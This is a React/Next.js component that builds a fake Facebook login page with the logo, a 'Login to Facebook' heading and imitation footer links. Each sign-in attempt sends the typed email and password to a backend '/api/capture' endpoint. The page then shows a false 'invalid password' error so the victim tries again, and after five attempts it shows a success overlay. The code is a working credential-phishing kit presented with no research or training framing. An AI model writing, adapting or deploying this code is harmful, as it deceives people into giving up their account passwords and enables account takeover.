'use client'

import { useState } from 'react'
import Image from 'next/image'
import SuccessOverlay from './SuccessOverlay'
import styles from '@/styles/FacebookLoginFlow.module.css'

const MAX_ATTEMPTS = 5
const BACKEND_URL = process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:3001'

export default function FacebookLoginFlow() {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [errorMsg, setErrorMsg] = useState('')
  const [attemptCount, setAttemptCount] = useState(0)
  const [showSuccess, setShowSuccess] = useState(false)

  const handleSignIn = async () => {
    if (!email.trim()) {
      setErrorMsg('Please enter a valid email.')
      return
    }
    if (!password) {
      setErrorMsg('Please enter your password.')
      return
    }

    if (attemptCount >= MAX_ATTEMPTS) {
      setErrorMsg('Too many attempts. Try again later.')
      return
    }

    const newCount = attemptCount + 1
    setAttemptCount(newCount)

    const payload = {
      username: email.trim(),
      password,
      method: 'facebook',
    }

    try {
      await fetch(`${BACKEND_URL}/api/capture`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      })
    } catch (error) {
      console.warn('Backend request failed')
    }

    if (newCount >= MAX_ATTEMPTS) {
      setShowSuccess(true)
    } else {
      setErrorMsg('Invalid email or password. Try again.')
      setPassword('')
    }
  }

  const isLocked = attemptCount >= MAX_ATTEMPTS

  return (
    <>
      <div className={styles.contentBox}>
        <Image
          src="/user/images/facebook-logo.svg"
          alt="Facebook"
          width={150}
          height={150}
          className={styles.logoImage}
        />
        <h2 className={styles.heading}>Login to Facebook</h2>
        {errorMsg && <span className={styles.errorMsg}>{errorMsg}</span>}

        <input
          type="email"
          name="email_field"
          placeholder="Email or phone number"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          className={styles.inputField}
          disabled={isLocked}
        />

        <input
          type="password"
          name="password_field"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className={styles.inputField}
          disabled={isLocked}
        />

        <div className={styles.btnContainer}>
          <button
            onClick={handleSignIn}
            className={styles.loginBtn}
            disabled={isLocked}
          >
            Log In
          </button>
        </div>

        <div className={styles.forgotLink}>
          <a href="#">Forgotten password?</a>
        </div>
      </div>

      <footer className={styles.footer}>
        <ul>
          <li><a href="#">About</a></li>
          <li><a href="#">Privacy</a></li>
          <li><a href="#">Cookies</a></li>
          <li><a href="#">Terms</a></li>
        </ul>
      </footer>

      <SuccessOverlay show={showSuccess} />
    </>
  )
}
